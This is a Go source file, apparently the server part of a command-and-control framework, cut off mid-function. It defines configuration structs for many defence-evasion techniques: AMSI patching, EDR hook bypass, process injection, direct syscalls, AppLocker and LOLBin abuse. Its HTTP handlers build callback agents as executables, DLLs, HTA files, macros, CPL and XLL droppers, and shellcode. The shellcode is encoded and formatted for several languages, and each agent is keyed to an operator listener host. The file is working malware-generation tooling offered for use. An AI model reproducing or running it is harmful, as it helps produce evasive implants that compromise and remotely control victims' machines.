package server

import (
	"crypto/rand"
	"crypto/sha256"
	"encoding/base64"
	"encoding/binary"
	"encoding/hex"
	"encoding/json"
	"fmt"
	mrand "math/rand"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"strings"

	log "github.com/sirupsen/logrus"
)

// ---------------------------------------------------------------------------
// Evasion technique category structs
// ---------------------------------------------------------------------------

// EvasionExecution contains execution-related evasion techniques.
type EvasionExecution struct {
	InMemory       bool `json:"in_memory"`
	NoDisk         bool `json:"no_disk"`
	StagedChunks   bool `json:"staged_chunks"`
	DelayExec      bool `json:"delay_exec"`
	EnvKeying      bool `json:"env_keying"`
	TimeStomp      bool `json:"time_stomp"`
	Polymorphic    bool `json:"polymorphic"`
	Metamorphic    bool `json:"metamorphic"`
	JITCompile     bool `json:"jit_compile"`
	ThreadPool     bool `json:"thread_pool"`
}

// EvasionAppLocker contains AppLocker bypass techniques.
type EvasionAppLocker struct {
	DLLSideload       bool `json:"dll_sideload"`
	MSBuildExec       bool `json:"msbuild_exec"`
	InstallUtilExec   bool `json:"installutil_exec"`
	RegSvrExec        bool `json:"regsvr_exec"`
	RunDLL32Exec      bool `json:"rundll32_exec"`
	MShta             bool `json:"mshta"`
	CMSTP             bool `json:"cmstp"`
	WhitelistBypass   bool `json:"whitelist_bypass"`
	TrustedFolder     bool `json:"trusted_folder"`
	AlternateDataStr  bool `json:"alternate_data_stream"`
}

// EvasionTrustedPath contains trusted path abuse techniques.
type EvasionTrustedPath struct {
	SystemDir     bool `json:"system_dir"`
	ProgramFiles  bool `json:"program_files"`
	WindowsApps   bool `json:"windows_apps"`
	TempSigned    bool `json:"temp_signed"`
	RecycleBin    bool `json:"recycle_bin"`
	WinSxS        bool `json:"winsxs"`
	DriverStore   bool `json:"driver_store"`
	GlobalAssembly bool `json:"global_assembly"`
	COMSurrogate  bool `json:"com_surrogate"`
	PrintSpooler  bool `json:"print_spooler"`
}

// EvasionMemoryLoaders contains memory loader techniques.
type EvasionMemoryLoaders struct {
	ReflectiveDLL     bool `json:"reflective_dll"`
	ManualMap         bool `json:"manual_map"`
	ModuleOverload    bool `json:"module_overload"`
	TransactedHollow  bool `json:"transacted_hollow"`
	GhostlyHollow     bool `json:"ghostly_hollow"`
	PhantomDLL        bool `json:"phantom_dll"`
	DoppelGanging     bool `json:"doppelganging"`
	Herpaderping      bool `json:"herpaderping"`
	ProcessHollow     bool `json:"process_hollow"`
	MemoryModule      bool `json:"memory_module"`
}

// EvasionProcessInjection contains process injection techniques.
type EvasionProcessInjection struct {
	ClassicInjection   bool `json:"classic_injection"`
	APCQueueInjection  bool `json:"apc_queue_injection"`
	ThreadHijack       bool `json:"thread_hijack"`
	EarlyBird          bool `json:"early_bird"`
	AtomBombing        bool `json:"atom_bombing"`
	NtCreateSection    bool `json:"nt_create_section"`
	KernelCallback     bool `json:"kernel_callback"`
	FiberInjection     bool `json:"fiber_injection"`
	EnclaveInjection   bool `json:"enclave_injection"`
	PoolParty          bool `json:"pool_party"`
}

// EvasionAMSIScript contains AMSI and script bypass techniques.
type EvasionAMSIScript struct {
	AMSIPatch        bool `json:"amsi_patch"`
	AMSIScanBuffer   bool `json:"amsi_scan_buffer"`
	AMSIProviderHijack bool `json:"amsi_provider_hijack"`
	WLDPBypass       bool `json:"wldp_bypass"`
	ScriptBlock      bool `json:"script_block"`
	CLMBypass        bool `json:"clm_bypass"`
	PowerShellHollow bool `json:"powershell_hollow"`
	DotNetPatch      bool `json:"dotnet_patch"`
	ScriptObfuscate  bool `json:"script_obfuscate"`
	JScriptBypass    bool `json:"jscript_bypass"`
}

// EvasionLOLBins contains living-off-the-land binary techniques.
type EvasionLOLBins struct {
	CertUtil     bool `json:"certutil"`
	BitsAdmin    bool `json:"bitsadmin"`
	MpCmdRun     bool `json:"mpcmdrun"`
	Esentutl     bool `json:"esentutl"`
	ExpandDL     bool `json:"expand_dl"`
	ExtractDL    bool `json:"extract_dl"`
	Hh           bool `json:"hh"`
	Ie4uInit     bool `json:"ie4uinit"`
	Replace      bool `json:"replace_dl"`
	XCopy        bool `json:"xcopy"`
}

// EvasionEDRBehavioral contains EDR behavioral evasion techniques.
type EvasionEDRBehavioral struct {
	UserModeHookBypass bool `json:"user_mode_hook_bypass"`
	KernelCallbacks    bool `json:"kernel_callbacks"`
	ETWBlinding        bool `json:"etw_blinding"`
	StackSpoofing      bool `json:"stack_spoofing"`
	CallStackMask      bool `json:"call_stack_mask"`
	ReturnAddrSpoof    bool `json:"return_addr_spoof"`
	IndirectSyscall    bool `json:"indirect_syscall"`
	TimestampManip     bool `json:"timestamp_manip"`
	ThreadlessInject   bool `json:"threadless_inject"`
	HWBreakpoints      bool `json:"hw_breakpoints"`
}

// EvasionDotNet contains .NET specific evasion techniques.
type EvasionDotNet struct {
	InMemoryAssembly   bool `json:"in_memory_assembly"`
	AppDomainManager   bool `json:"app_domain_manager"`
	CLRHosting         bool `json:"clr_hosting"`
	DynamicInvoke      bool `json:"dynamic_invoke"`
	ReflectionObfusc   bool `json:"reflection_obfusc"`
	AssemblyLoadByte   bool `json:"assembly_load_byte"`
	TypeConfusion      bool `json:"type_confusion"`
	GarbageCollector   bool `json:"garbage_collector"`
	MixedAssembly      bool `json:"mixed_assembly"`
	ProfilerAttach     bool `json:"profiler_attach"`
}

// EvasionSyscalls contains syscall-based evasion techniques.
type EvasionSyscalls struct {
	DirectSyscalls     bool `json:"direct_syscalls"`
	IndirectSyscalls   bool `json:"indirect_syscalls"`
	SyscallStub        bool `json:"syscall_stub"`
	SyscallRandomize   bool `json:"syscall_randomize"`
	SyscallUnhook      bool `json:"syscall_unhook"`
	SyscallGate        bool `json:"syscall_gate"`
	HellsGate          bool `json:"hells_gate"`
	HalosGate          bool `json:"halos_gate"`
	TartarusGate       bool `json:"tartarus_gate"`
	RecycledGate       bool `json:"recycled_gate"`
}

// EvasionConfig is the top-level struct for all evasion categories.
type EvasionConfig struct {
	Execution        EvasionExecution        `json:"execution"`
	AppLocker        EvasionAppLocker        `json:"applocker"`
	TrustedPath      EvasionTrustedPath      `json:"trusted_path"`
	MemoryLoaders    EvasionMemoryLoaders    `json:"memory_loaders"`
	ProcessInjection EvasionProcessInjection `json:"process_injection"`
	AMSIScript       EvasionAMSIScript       `json:"amsi_script"`
	LOLBins          EvasionLOLBins          `json:"lolbins"`
	EDRBehavioral    EvasionEDRBehavioral    `json:"edr_behavioral"`
	DotNet           EvasionDotNet           `json:"dotnet"`
	Syscalls         EvasionSyscalls         `json:"syscalls"`
}

// EncryptionConfig holds transport and payload encryption settings.
type EncryptionConfig struct {
	TransportType string `json:"transport_type"` // aes, xor, rc4
	PayloadType   string `json:"payload_type"`   // none, xor, aes, rc4
	Key           string `json:"key"`            // hex-encoded; auto-generated if empty
}

// OpsecConfig holds operational security options that are compiled into the agent.
type OpsecConfig struct {
	SleepMask        bool   `json:"sleep_mask"`
	StackSpoof       bool   `json:"stack_spoof"`
	ModuleStomping   bool   `json:"module_stomping"`
	SyscallMethod    string `json:"syscall_method"` // none, direct, indirect
	ETWPatch         bool   `json:"etw_patch"`
	UnhookNtdll      bool   `json:"unhook_ntdll"`
	ThreadStackSpoof bool   `json:"thread_stack_spoof"`
	HeapEncryption   bool   `json:"heap_encryption"`
}

// ---------------------------------------------------------------------------
// Key generation helpers
// ---------------------------------------------------------------------------

// generateKey creates a random hex-encoded key of the appropriate length for
// the given encryption type.
func generateKey(keyType string) string {
	switch keyType {
	case "xor":
		key := make([]byte, 16)
		rand.Read(key)
		return hex.EncodeToString(key)
	case "aes":
		key := make([]byte, 32)
		rand.Read(key)
		return hex.EncodeToString(key)
	case "rc4":
		key := make([]byte, 16)
		rand.Read(key)
		return hex.EncodeToString(key)
	default:
		return ""
	}
}

// generateBuildID creates a short unique identifier for per-request build
// directories, preventing race conditions when concurrent builds occur.
func generateBuildID() string {
	b := make([]byte, 4)
	rand.Read(b)
	return hex.EncodeToString(b)
}

// ---------------------------------------------------------------------------
// Shellcode format converter
// ---------------------------------------------------------------------------

// formatShellcode converts raw shellcode bytes into the requested output format.
func formatShellcode(data []byte, format string) []byte {
	switch format {
	case "c_array":
		var buf strings.Builder
		buf.WriteString("unsigned char shellcode[] = {\n    ")
		for i, b := range data {
			if i > 0 {
				buf.WriteString(", ")
				if i%12 == 0 {
					buf.WriteString("\n    ")
				}
			}
			buf.WriteString(fmt.Sprintf("0x%02x", b))
		}
		buf.WriteString("\n};\n")
		buf.WriteString(fmt.Sprintf("// Size: %d bytes\n", len(data)))
		return []byte(buf.String())
	case "python":
		var buf strings.Builder
		buf.WriteString("shellcode = b\"\"\n")
		buf.WriteString("shellcode += b\"")
		for i, b := range data {
			buf.WriteString(fmt.Sprintf("\\x%02x", b))
			if (i+1)%16 == 0 && i+1 < len(data) {
				buf.WriteString("\"\nshellcode += b\"")
			}
		}
		buf.WriteString("\"\n")
		buf.WriteString(fmt.Sprintf("# Size: %d bytes\n", len(data)))
		return []byte(buf.String())
	case "csharp":
		var buf strings.Builder
		buf.WriteString("byte[] shellcode = new byte[] {\n    ")
		for i, b := range data {
			if i > 0 {
				buf.WriteString(", ")
				if i%12 == 0 {
					buf.WriteString("\n    ")
				}
			}
			buf.WriteString(fmt.Sprintf("0x%02x", b))
		}
		buf.WriteString("\n};\n")
		buf.WriteString(fmt.Sprintf("// Size: %d bytes\n", len(data)))
		return []byte(buf.String())
	case "powershell":
		var buf strings.Builder
		buf.WriteString("[Byte[]] $shellcode = @(\n    ")
		for i, b := range data {
			if i > 0 {
				buf.WriteString(", ")
				if i%10 == 0 {
					buf.WriteString("\n    ")
				}
			}
			buf.WriteString(fmt.Sprintf("0x%02X", b))
		}
		buf.WriteString("\n)\n")
		buf.WriteString(fmt.Sprintf("# Size: %d bytes\n", len(data)))
		return []byte(buf.String())
	case "nim":
		var buf strings.Builder
		buf.WriteString(fmt.Sprintf("var shellcode: array[%d, byte] = [\n    ", len(data)))
		for i, b := range data {
			if i > 0 {
				buf.WriteString(", ")
				if i%12 == 0 {
					buf.WriteString("\n    ")
				}
			}
			buf.WriteString(fmt.Sprintf("byte 0x%02x", b))
		}
		buf.WriteString("\n]\n")
		buf.WriteString(fmt.Sprintf("# Size: %d bytes\n", len(data)))
		return []byte(buf.String())
	case "go":
		var buf strings.Builder
		buf.WriteString("shellcode := []byte{\n    ")
		for i, b := range data {
			if i > 0 {
				buf.WriteString(", ")
				if i%12 == 0 {
					buf.WriteString("\n    ")
				}
			}
			buf.WriteString(fmt.Sprintf("0x%02x", b))
		}
		buf.WriteString("\n}\n")
		buf.WriteString(fmt.Sprintf("// Size: %d bytes\n", len(data)))
		return []byte(buf.String())
	case "rust":
		var buf strings.Builder
		buf.WriteString(fmt.Sprintf("let shellcode: [u8; %d] = [\n    ", len(data)))
		for i, b := range data {
			if i > 0 {
				buf.WriteString(", ")
				if i%12 == 0 {
					buf.WriteString("\n    ")
				}
			}
			buf.WriteString(fmt.Sprintf("0x%02x", b))
		}
		buf.WriteString("\n];\n")
		buf.WriteString(fmt.Sprintf("// Size: %d bytes\n", len(data)))
		return []byte(buf.String())
	default: // "raw"
		return data
	}
}

// ---------------------------------------------------------------------------
// boolToDefine converts a boolean to "1" or "0" for C preprocessor defines.
// ---------------------------------------------------------------------------
func boolToDefine(b bool) string {
	if b {
		return "1"
	}
	return "0"
}

// ---------------------------------------------------------------------------
// handleGeneratePayload generates a payload by invoking the build script with
// full evasion, encryption, OPSEC, and architecture configuration.
// ---------------------------------------------------------------------------
func (h *HTTPAPIServer) handleGeneratePayload(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		jsonError(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}

	var req struct {
		Format           string           `json:"format"`
		Arch             string           `json:"arch"`
		OSTarget         string           `json:"os_target"`
		ListenerID       string           `json:"listener_id"`
		CallbackHost     string           `json:"callback_host"`     // override for 0.0.0.0 bind
		Sleep            int              `json:"sleep"`
		Jitter           int              `json:"jitter"`
		Encryption       EncryptionConfig `json:"encryption"`
		Evasion          EvasionConfig    `json:"evasion"`
		Opsec            OpsecConfig      `json:"opsec"`
		ShellcodeFormat  string           `json:"shellcode_format"`  // raw, c_array, python, csharp, powershell, nim, go, rust
		ShellcodeEncoding string          `json:"shellcode_encoding"` // none, xor, rc4, sgn
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		jsonError(w, "invalid request body", http.StatusBadRequest)
		return
	}

	// ------------------------------------------------------------------
	// Validate format
	// ------------------------------------------------------------------
	validFormats := map[string]bool{
		"exe": true, "dll": true, "shellcode": true,
		"powershell": true, "hta": true, "macro": true, "service_exe": true,
		"loader": true, "loader_dll": true,
		"cpl": true, "xll": true,
	}
	if !validFormats[req.Format] {
		jsonError(w, fmt.Sprintf("unsupported format: %s", req.Format), http.StatusBadRequest)
		return
	}

	// ------------------------------------------------------------------
	// Validate arch (now includes arm64)
	// ------------------------------------------------------------------
	validArch := map[string]bool{"x64": true, "x86": true, "arm64": true}
	if !validArch[req.Arch] {
		jsonError(w, fmt.Sprintf("unsupported arch: %s", req.Arch), http.StatusBadRequest)
		return
	}

	// ------------------------------------------------------------------
	// Validate OS target
	// ------------------------------------------------------------------
	validOS := map[string]bool{"windows": true, "linux": true, "macos": true}
	if !validOS[req.OSTarget] {
		jsonError(w, fmt.Sprintf("unsupported os_target: %s", req.OSTarget), http.StatusBadRequest)
		return
	}

	// ------------------------------------------------------------------
	// Validate encryption options
	// ------------------------------------------------------------------
	validTransport := map[string]bool{"aes": true, "xor": true, "rc4": true, "": true}
	if !validTransport[req.Encryption.TransportType] {
		jsonError(w, fmt.Sprintf("unsupported transport encryption type: %s", req.Encryption.TransportType), http.StatusBadRequest)
		return
	}
	validPayloadEnc := map[string]bool{"none": true, "xor": true, "aes": true, "rc4": true, "": true}
	if !validPayloadEnc[req.Encryption.PayloadType] {
		jsonError(w, fmt.Sprintf("unsupported payload encryption type: %s", req.Encryption.PayloadType), http.StatusBadRequest)
		return
	}

	// ------------------------------------------------------------------
	// Validate OPSEC syscall method
	// ------------------------------------------------------------------
	validSyscallMethod := map[string]bool{"none": true, "direct": true, "indirect": true, "": true}
	if !validSyscallMethod[req.Opsec.SyscallMethod] {
		jsonError(w, fmt.Sprintf("unsupported syscall method: %s", req.Opsec.SyscallMethod), http.StatusBadRequest)
		return
	}

	// ------------------------------------------------------------------
	// Validate shellcode output format
	// ------------------------------------------------------------------
	validShellcodeFmt := map[string]bool{"raw": true, "c_array": true, "python": true, "csharp": true, "powershell": true, "nim": true, "go": true, "rust": true, "": true}
	if !validShellcodeFmt[req.ShellcodeFormat] {
		jsonError(w, fmt.Sprintf("unsupported shellcode_format: %s", req.ShellcodeFormat), http.StatusBadRequest)
		return
	}

	// ------------------------------------------------------------------
	// Validate shellcode encoding method
	// ------------------------------------------------------------------
	validShellcodeEnc := map[string]bool{"none": true, "xor": true, "rc4": true, "sgn": true, "": true}
	if !validShellcodeEnc[req.ShellcodeEncoding] {
		jsonError(w, fmt.Sprintf("unsupported shellcode_encoding: %s", req.ShellcodeEncoding), http.StatusBadRequest)
		return
	}

	// ------------------------------------------------------------------
	// Auto-generate encryption keys when empty
	// ------------------------------------------------------------------
	if req.Encryption.TransportType != "" && req.Encryption.Key == "" {
		req.Encryption.Key = generateKey(req.Encryption.TransportType)
	}
	// For payload encryption, generate a separate key if needed. We reuse the
	// same key field (transport key) unless the caller explicitly splits them.
	// The build script can derive a separate payload key from the transport key.

	// ------------------------------------------------------------------
	// Look up the listener to get host/port
	// ------------------------------------------------------------------
	l, ok := h.listenerManager.Get(req.ListenerID)
	if !ok {
		jsonError(w, "listener not found", http.StatusNotFound)
		return
	}

	addr := l.Address()
	parts := strings.SplitN(addr, ":", 2)
	if len(parts) != 2 {
		jsonError(w, "invalid listener address", http.StatusInternalServerError)
		return
	}
	listenerHost := parts[0]
	listenerPort := parts[1]

	// 0.0.0.0 is a bind-all address, not routable. Use the callback host
	// from the request if provided, otherwise default to 127.0.0.1.
	if listenerHost == "0.0.0.0" || listenerHost == "" || listenerHost == "::" {
		if req.CallbackHost != "" {
			listenerHost = req.CallbackHost
		} else {
			listenerHost = "127.0.0.1"
		}
	}

	isHTTPS := l.Protocol() == 1 // ProtoHTTPS = 1

	// The agent's C2 transport key MUST match the listener's master key.
	// The frontend's encryption.key is for payload obfuscation only, not
	// for the C2 channel. Always use the server's master AES key here.
	cryptoKey := h.config.Crypto.AESKey

	// Set defaults
	if req.Sleep <= 0 {
		req.Sleep = 5
	}
	if req.Jitter < 0 {
		req.Jitter = 10
	}
	if req.Opsec.SyscallMethod == "" {
		req.Opsec.SyscallMethod = "none"
	}
	if req.Encryption.TransportType == "" {
		req.Encryption.TransportType = "aes"
	}
	if req.Encryption.PayloadType == "" {
		req.Encryption.PayloadType = "none"
	}
	if req.ShellcodeFormat == "" {
		req.ShellcodeFormat = "raw"
	}

	// ------------------------------------------------------------------
	// Locate scripts and prepare build directory
	// ------------------------------------------------------------------
	scriptsDir := findScriptsDir()
	if scriptsDir == "" {
		jsonError(w, "scripts directory not found", http.StatusInternalServerError)
		return
	}

	// Use a unique per-request build directory to prevent race conditions
	// when multiple payload generation requests run concurrently.
	buildDir := filepath.Join(filepath.Dir(scriptsDir), "build", generateBuildID())
	if err := os.MkdirAll(buildDir, 0700); err != nil {
		jsonError(w, "failed to create build directory", http.StatusInternalServerError)
		return
	}
	defer os.RemoveAll(buildDir)

	// ------------------------------------------------------------------
	// Build environment variables for evasion / encryption / OPSEC
	// These are consumed by the build scripts and passed as -D flags to
	// the compiler so they end up in config.h.in.
	// ------------------------------------------------------------------
	envVars := buildEnvVars(req.Encryption, req.Evasion, req.Opsec)

	// ------------------------------------------------------------------
	// Construct the script invocation
	// ------------------------------------------------------------------
	var scriptPath string
	var args []string
	var outputFilename string

	switch req.Format {
	case "powershell", "hta", "macro":
		scriptPath = filepath.Join(scriptsDir, "generate_powershell.sh")

		typeMap := map[string]string{
			"powershell": "download",
			"hta":        "hta",
			"macro":      "macro",
		}
		scriptType := typeMap[req.Format]

		extMap := map[string]string{
			"powershell": "ps1",
			"hta":        "hta",
			"macro":      "vba",
		}
		outputFilename = fmt.Sprintf("payload_%s_%s.%s", req.Format, req.ListenerID, extMap[req.Format])

		args = []string{
			"--host", listenerHost,
			"--port", listenerPort,
			"--key", cryptoKey,
			"--sleep", fmt.Sprintf("%d", req.Sleep),
			"--jitter", fmt.Sprintf("%d", req.Jitter),
			"--type", scriptType,
			"-o", filepath.Join(buildDir, outputFilename),
		}

		if req.Evasion.AMSIScript.AMSIPatch {
			args = append(args, "--amsi-bypass")
		}
		if isHTTPS {
			args = append(args, "--tls")
		}

	case "exe", "dll", "shellcode", "service_exe", "loader", "loader_dll", "cpl", "xll":
		scriptPath = filepath.Join(scriptsDir, "generate_agent.sh")

		extMap := map[string]string{
			"exe":         "exe",
			"dll":         "dll",
			"shellcode":   "bin",
			"service_exe": "exe",
			"loader":      "exe",
			"loader_dll":  "dll",
			"cpl":         "cpl",
			"xll":         "xll",
		}
		// Use appropriate extension for POSIX
		ext := extMap[req.Format]
		if (req.Format == "exe" || req.Format == "loader") && req.OSTarget != "windows" {
			ext = ""
		}
		if ext != "" {
			outputFilename = fmt.Sprintf("agent_%s_%s_%s.%s", req.OSTarget, req.Arch, req.ListenerID, ext)
		} else {
			outputFilename = fmt.Sprintf("agent_%s_%s_%s", req.OSTarget, req.Arch, req.ListenerID)
		}

		args = []string{
			"--host", listenerHost,
			"--port", listenerPort,
			"--key", cryptoKey,
			"--sleep", fmt.Sprintf("%d", req.Sleep),
			"--jitter", fmt.Sprintf("%d", req.Jitter),
			"--platform", req.OSTarget,
			"--arch", req.Arch,
			"-o", filepath.Join(buildDir, outputFilename),
		}

		if isHTTPS {
			args = append(args, "--tls")
		}
		if req.Format == "shellcode" {
			args = append(args, "--shellcode")
		}
		if req.Format == "service_exe" {
			args = append(args, "--service")
		}
		if req.Format == "loader" {
			args = append(args, "--shellcode", "--loader", "--loader-format", "exe")
		}
		if req.Format == "loader_dll" {
			args = append(args, "--shellcode", "--loader", "--loader-format", "dll")
		}
		if req.Format == "cpl" {
			args = append(args, "--dll", "--export", "CPlApplet")
		}
		if req.Format == "xll" {
			args = append(args, "--dll", "--export", "xlAutoOpen")
		}
	}

	log.Infof("Generating payload: %s %s", scriptPath, strings.Join(args, " "))

	cmd := exec.Command(scriptPath, args...)
	cmd.Dir = filepath.Dir(scriptsDir)
	cmd.Env = append(os.Environ(), envVars...)
	output, err := cmd.CombinedOutput()
	if err != nil {
		log.Errorf("Payload generation failed: %v\nOutput: %s", err, string(output))
		jsonError(w, fmt.Sprintf("payload generation failed: %s", string(output)), http.StatusInternalServerError)
		return
	}

	// ------------------------------------------------------------------
	// Read the generated file
	// ------------------------------------------------------------------
	outputPath := filepath.Join(buildDir, outputFilename)
	fileData, err := os.ReadFile(outputPath)
	if err != nil {
		log.Errorf("Failed to read generated payload: %v", err)
		jsonError(w, "failed to read generated payload", http.StatusInternalServerError)
		return
	}

	// Apply shellcode encoding if requested (before formatting)
	encodingUsed := req.ShellcodeEncoding
	if req.Format == "shellcode" && req.ShellcodeEncoding != "" && req.ShellcodeEncoding != "none" {
		rawSize := len(fileData)
		encodedData, err := encodeShellcode(fileData, req.ShellcodeEncoding)
		if err != nil {
			log.Errorf("Shellcode encoding failed: %v", err)
			jsonError(w, fmt.Sprintf("shellcode encoding failed: %v", err), http.StatusInternalServerError)
			return
		}
		fileData = encodedData
		log.Infof("Shellcode encoded with %s: %d -> %d bytes", req.ShellcodeEncoding, rawSize, len(fileData))
	}

	// Apply shellcode formatting if the format is shellcode
	if req.Format == "shellcode" && req.ShellcodeFormat != "raw" {
		fileData = formatShellcode(fileData, req.ShellcodeFormat)
	}

	hash := sha256.Sum256(fileData)
	hashStr := fmt.Sprintf("%x", hash)
	encoded := base64.StdEncoding.EncodeToString(fileData)

	log.Infof("Payload generated: %s (%d bytes, SHA256: %s)", outputFilename, len(fileData), hashStr)

	jsonResponse(w, map[string]interface{}{
		"filename":            outputFilename,
		"data":                encoded,
		"size":                len(fileData),
		"hash":                hashStr,
		"encryption_key":      cryptoKey,
		"shellcode_format":    req.ShellcodeFormat,
		"shellcode_encoding":  encodingUsed,
	})
}

// ---------------------------------------------------------------------------
// handleGenerateShellcode builds the agent, extracts the .text section, and
// converts to the requested shellcode output format.
// POST /api/v1/payloads/shellcode
// ---------------------------------------------------------------------------
func (h *HTTPAPIServer) handleGenerateShellcode(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		jsonError(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}

	var req struct {
		Arch              string           `json:"arch"`
		OSTarget          string           `json:"os_target"`
		ListenerID        string           `json:"listener_id"`
		CallbackHost      string           `json:"callback_host"`
		Sleep             int              `json:"sleep"`
		Jitter            int              `json:"jitter"`
		Encryption        EncryptionConfig `json:"encryption"`
		Evasion           EvasionConfig    `json:"evasion"`
		Opsec             OpsecConfig      `json:"opsec"`
		ShellcodeFormat   string           `json:"shellcode_format"`   // raw, c_array, python, csharp, powershell, nim, go, rust
		ShellcodeEncoding string           `json:"shellcode_encoding"` // none, xor, rc4, sgn
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		jsonError(w, "invalid request body", http.StatusBadRequest)
		return
	}

	// Validate arch
	validArch := map[string]bool{"x64": true, "x86": true, "arm64": true}
	if !validArch[req.Arch] {
		jsonError(w, fmt.Sprintf("unsupported arch: %s", req.Arch), http.StatusBadRequest)
		return
	}

	// Validate OS
	validOS := map[string]bool{"windows": true, "linux": true, "macos": true}
	if !validOS[req.OSTarget] {
		jsonError(w, fmt.Sprintf("unsupported os_target: %s", req.OSTarget), http.StatusBadRequest)
		return
	}

	// Validate shellcode format
	validFmt := map[string]bool{"raw": true, "c_array": true, "python": true, "csharp": true, "powershell": true, "nim": true, "go": true, "rust": true, "": true}
	if !validFmt[req.ShellcodeFormat] {
		jsonError(w, fmt.Sprintf("unsupported shellcode_format: %s", req.ShellcodeFormat), http.StatusBadRequest)
		return
	}

	// Validate shellcode encoding
	validEncoding := map[string]bool{"none": true, "xor": true, "rc4": true, "sgn": true, "": true}
	if !validEncoding[req.ShellcodeEncoding] {
		jsonError(w, fmt.Sprintf("unsupported shellcode_encoding: %s", req.ShellcodeEncoding), http.StatusBadRequest)
		return
	}

	// Validate encryption
	validTransport := map[string]bool{"aes": true, "xor": true, "rc4": true, "": true}
	if !validTransport[req.Encryption.TransportType] {
		jsonError(w, fmt.Sprintf("unsupported transport encryption type: %s", req.Encryption.TransportType), http.StatusBadRequest)
		return
	}
	validPayloadEnc := map[string]bool{"none": true, "xor": true, "aes": true, "rc4": true, "": true}
	if !validPayloadEnc[req.Encryption.PayloadType] {
		jsonError(w, fmt.Sprintf("unsupported payload encryption type: %s", req.Encryption.PayloadType), http.StatusBadRequest)
		return
	}

	// Validate OPSEC syscall method
	validSyscallMethod := map[string]bool{"none": true, "direct": true, "indirect": true, "": true}
	if !validSyscallMethod[req.Opsec.SyscallMethod] {
		jsonError(w, fmt.Sprintf("unsupported syscall method: %s", req.Opsec.SyscallMethod), http.StatusBadRequest)
		return
	}

	// Auto-generate key
	if req.Encryption.TransportType != "" && req.Encryption.Key == "" {
		req.Encryption.Key = generateKey(req.Encryption.TransportType)
	}

	// Defaults
	if req.ShellcodeFormat == "" {
		req.ShellcodeFormat = "raw"
	}
	if req.Sleep <= 0 {
		req.Sleep = 5
	}
	if req.Jitter < 0 {
		req.Jitter = 10
	}
	if req.Opsec.SyscallMethod == "" {
		req.Opsec.SyscallMethod = "none"
	}
	if req.Encryption.TransportType == "" {
		req.Encryption.TransportType = "aes"
	}
	if req.Encryption.PayloadType == "" {
		req.Encryption.PayloadType = "none"
	}

	// Look up listener
	l, ok := h.listenerManager.Get(req.ListenerID)
	if !ok {
		jsonError(w, "listener not found", http.StatusNotFound)
		return
	}

	addr := l.Address()
	addrParts := strings.SplitN(addr, ":", 2)
	if len(addrParts) != 2 {
		jsonError(w, "invalid listener address", http.StatusInternalServerError)
		return
	}
	listenerHost := addrParts[0]
	listenerPort := addrParts[1]

	if listenerHost == "0.0.0.0" || listenerHost == "" || listenerHost == "::" {
		if req.CallbackHost != "" {
			listenerHost = req.CallbackHost
		} else {
			listenerHost = "127.0.0.1"
		}
	}

	isHTTPS := l.Protocol() == 1

	cryptoKey := h.config.Crypto.AESKey

	scriptsDir := findScriptsDir()
	if scriptsDir == "" {
		jsonError(w, "scripts directory not found", http.StatusInternalServerError)
		return
	}

	// Use a unique per-request build directory to prevent race conditions
	// when multiple shellcode generation requests run concurrently.
	buildDir := filepath.Join(filepath.Dir(scriptsDir), "build", generateBuildID())
	if err := os.MkdirAll(buildDir, 0700); err != nil {
		jsonError(w, "failed to create build directory", http.StatusInternalServerError)
		return
	}
	defer os.RemoveAll(buildDir)

	// ------------------------------------------------------------------
	// Step 1: Build the agent as a raw binary (with --shellcode flag)
	// ------------------------------------------------------------------
	outputFilename := fmt.Sprintf("shellcode_%s_%s_%s.bin", req.OSTarget, req.Arch, req.ListenerID)
	scriptPath := filepath.Join(scriptsDir, "generate_agent.sh")

	args := []string{
		"--host", listenerHost,
		"--port", listenerPort,
		"--key", cryptoKey,
		"--sleep", fmt.Sprintf("%d", req.Sleep),
		"--jitter", fmt.Sprintf("%d", req.Jitter),
		"--platform", req.OSTarget,
		"--arch", req.Arch,
		"--shellcode",
		"-o", filepath.Join(buildDir, outputFilename),
	}
	if isHTTPS {
		args = append(args, "--tls")
	}

	envVars := buildEnvVars(req.Encryption, req.Evasion, req.Opsec)

	log.Infof("Generating shellcode: %s %s", scriptPath, strings.Join(args, " "))

	cmd := exec.Command(scriptPath, args...)
	cmd.Dir = filepath.Dir(scriptsDir)
	cmd.Env = append(os.Environ(), envVars...)
	output, err := cmd.CombinedOutput()
	if err != nil {
		log.Errorf("Shellcode generation failed: %v\nOutput: %s", err, string(output))
		jsonError(w, fmt.Sprintf("shellcode generation failed: %s", string(output)), http.StatusInternalServerError)
		return
	}

	// ------------------------------------------------------------------
	// Step 2: Read the raw shellcode
	// ------------------------------------------------------------------
	outputPath := filepath.Join(buildDir, outputFilename)
	rawData, err := os.ReadFile(outputPath)
	if err != nil {
		log.Errorf("Failed to read generated shellcode: %v", err)
		jsonError(w, "failed to read generated shellcode", http.StatusInternalServerError)
		return
	}

	// ------------------------------------------------------------------
	// Step 3: Try to extract .text section with objcopy if available
	// ------------------------------------------------------------------
	textSection := extractTextSection(outputPath, buildDir, req.Arch)
	if textSection != nil {
		rawData = textSection
	}

	// ------------------------------------------------------------------
	// Step 4: Apply shellcode encoding if requested (before formatting)
	// ------------------------------------------------------------------
	encodingUsed := req.ShellcodeEncoding
	if req.ShellcodeEncoding != "" && req.ShellcodeEncoding != "none" {
		encodedData, err := encodeShellcode(rawData, req.ShellcodeEncoding)
		if err != nil {
			log.Errorf("Shellcode encoding failed: %v", err)
			jsonError(w, fmt.Sprintf("shellcode encoding failed: %v", err), http.StatusInternalServerError)
			return
		}
		log.Infof("Shellcode encoded with %s: %d -> %d bytes", req.ShellcodeEncoding, len(rawData), len(encodedData))
		rawData = encodedData
	}

	// ------------------------------------------------------------------
	// Step 5: Convert to the requested shellcode format
	// ------------------------------------------------------------------
	formattedData := formatShellcode(rawData, req.ShellcodeFormat)

	hash := sha256.Sum256(formattedData)
	hashStr := fmt.Sprintf("%x", hash)
	encoded := base64.StdEncoding.EncodeToString(formattedData)

	// Determine appropriate content type for the response
	contentType := "application/octet-stream"
	switch req.ShellcodeFormat {
	case "c_array", "csharp", "python", "powershell", "nim", "go", "rust":
		contentType = "text/plain"
	}

